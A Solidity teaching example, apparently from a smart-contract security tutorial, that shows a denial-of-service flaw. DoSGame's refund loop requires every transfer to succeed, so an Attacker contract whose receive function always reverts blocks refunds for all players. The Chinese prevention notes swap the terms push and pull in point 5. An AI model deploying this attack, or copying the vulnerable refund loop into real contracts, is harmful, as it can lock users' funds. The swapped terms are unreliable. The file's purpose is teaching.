// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/*
预防方法
很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：

1. 外部合约的函数调用（例如 call）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 require(success, "Refund Fail!"); 去掉，退款在单个地址失败时仍能继续运行。
2. 合约不会出乎意料的自毁。
3. 合约不会进入无限循环。
4. require 和 assert 的参数设定正确。
5. 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。
6. 确保回调函数不会影响正常合约运行。
7. 确保当合约的参与者（例如 owner）永远缺席时，合约的主要业务仍能顺利运行。
*/

contract DoSGame {

    mapping(address => uint256) public balanceOf;

    address[] public players;

    function deposit() external payable {
        balanceOf[msg.sender] = msg.value;
        players.push(msg.sender);
    }

    function refund() external payable {
        for (uint256 i = 0; i < players.length; i++) {
            address account = players[i];
            (bool ok, ) = account.call{value: balanceOf[account]}("");
            require(ok, "call failed");
            balanceOf[account] = 0;
        }
    }
}

contract Attacker {

    receive() external payable {
        revert("DoS Attack");
    }

    function attack(DoSGame target) external payable {
        target.deposit{value: msg.value}();
    }
}
